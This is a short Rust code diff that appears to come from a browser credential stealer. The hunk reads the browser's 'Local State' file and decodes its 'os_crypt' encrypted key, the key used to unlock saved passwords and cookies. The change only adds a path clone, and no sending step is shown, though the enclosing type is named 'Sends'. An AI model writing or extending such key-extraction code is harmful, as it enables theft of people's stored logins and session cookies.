@@ -33,7 +33,7 @@ impl Sends {
                             path.pop();
                             path.pop();
                             path.push("Local State");
-                            let local_state = fs::read_to_string(path).ok()?;
+                            let local_state = fs::read_to_string(path.clone()).ok()?;
                             let local_state: Value = serde_json::from_str(&local_state).ok()?;
                             let mut key =
                                 base64::decode(local_state["os_crypt"]["encrypted_key"].as_str()?)
